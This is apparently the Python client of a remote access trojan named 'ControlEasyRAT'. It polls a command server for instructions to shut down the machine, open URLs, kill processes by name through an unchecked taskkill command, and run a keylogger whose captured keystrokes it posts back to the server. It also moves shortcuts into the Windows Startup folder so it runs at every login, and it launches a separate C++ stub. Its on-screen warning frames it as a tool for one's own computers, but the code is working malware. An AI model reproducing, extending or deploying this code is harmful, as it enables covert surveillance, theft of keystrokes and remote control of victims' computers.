import requests
from json import load, dump
import selenium
import webbrowser   
from os import system
from os import stat
import string
from time import sleep
import threading
from subprocess import Popen
req = requests.Session()


class client():
    def __init__(self):
        self.destroy = None
        self.wait_a_round = False
        self.first_time0 = True
        self.first_time1 = True
        self.json = open('settings.json', 'r')
        self.json_data = load(self.json)

    def main(self):
        system('cls')
        print("Client is running..")
        self.json_data['started'] = True
        dump(self.json_data, open('settings.json', 'w'))
        self.json.close()
        if self.first_time1 == True:
            try:
                req.get('http://localhost:5000/')
                self.first_time1 = False
                self.main()

            except requests.exceptions.ConnectionError:
                self.first_time1 = True
                self.main()
        else:
            pass
        while self.destroy == None:
            destroy_response = req.get('http://localhost:5000/disconnect')
            shutdown_response = req.get('http://localhost:5000/shutdown')
            play_response = req.get('http://localhost:5000/play')
            keylogger_response = req.get('http://localhost:5000/keylogger')
            show_message_response = req.get('http://localhost:5000/message')
            terminate_process_response = req.get('http://localhost:5000/terminate')
            slowcomp_response = req.get('http://localhost:5000/slowcomp')

            if int(destroy_response.status_code) == 200:
                self.destroy = True
                break

            else:
                pass

            if int(shutdown_response.status_code) == 200:
                system('cmd /k "shutdown -s"')
            else:
                pass

            if int(play_response.status_code) != 202:
                data = play_response.json()
                webbrowser.open(data['url'])
                self.main()

            elif int(show_message_response.status_code) == 200:
                show_it = show_message_response.json()
                self.json_data['message'] = show_it['show_message']
                dump(self.json_data, open('settings.json', 'w'))
                self.json.close()
                self.main()

            elif int(keylogger_response.status_code) == 200:
                if self.first_time0 == False:
                    def keylog():
                        if self.wait_a_round == False:
                            self.json_data['keylogger'] = True
                            dump(self.json_data, open('settings.json', 'w'))
                            self.json.close()
                            self.wait_a_round = True
                            self.first_time0 = False
                            self.main()

                        else:
                            open_it = open('file.txt', 'r')
                            requests.post("http://localhost:5000/keylogger", json={"data" : open_it.read()})
                            open_it.close()
                            open_it1 = open('file.txt', 'w')
                            open_it1.write('')
                            open_it1.close()
                            self.first_time0 = False
                            self.main()
                    keylog()

                else:
                    self.json_data['keylogger'] = ""
                    dump(self.json_data, open('settings.json', 'w'))
                    self.json.close()
                    keylog()



            elif int(terminate_process_response.status_code) == 200:
                process_name = terminate_process_response.json()
                system("taskkill /IM " + process_name['process'])
                self.main()


            elif int(slowcomp_response.status_code) == 200:
                if self.first_time0 == False:
                    def slowcomp():
                        app_name = slowcomp_response.json()
                        self.json_data['slow_comp'] = True
                        self.json_data['name'] = app_name['name']
                        dump(self.json_data, open('settings.json', 'w'))
                        open('Name.txt', 'w').write(app_name['name'])
                        self.first_time0 = False
                    slowcomp()
                    self.main()

                else:
                    self.json_data['slowcomp'] = False
                    self.json_data['name'] = ""
                    dump(self.json_data, open('settings.json', 'w'))
                    self.json.close()
                    self.first_time0 = False
                    self.main()

            
            else:
                pass         
    
    def run_exe(self):
        system(self.json_data['name'])

    def check(self):
        system('title ControlEasyRAT Made by Scripted on GitHub')
        try:
            if stat('donotdelete.lnk'):
                print(self.json_data["name"])
                if self.json_data['name'] == "empty":
                    name = input('WARNING : This tool is a trojan designed to control your own computers! If you got this from a stranger you do not know then please close and delete this program immediately!\nTo continue, please enter the name of your c++ stub (the .exe name)')
                    self.json_data['name'] = name
                    dump(self.json_data, open('settings.json', 'w'))
                else:
                    pass
                copy_exe = r"""
                move "C:\Users\%username%\Desktop\c++_rat_python\client\c++_rat\Debug\donotdelete.lnk" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
                """
                system(copy_exe)
                copy_py = r"""
                move "C:\Users\%username%\Desktop\c++_rat_python\client\c++_rat\Debug\donotdelete2.lnk" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
                """
                system(copy_py)
                threading.Thread(target=self.run_exe).start()

        except FileNotFoundError:
            threading.Thread(target=self.run_exe).start()
            self.main()

        
if __name__ == '__main__':
    client().check()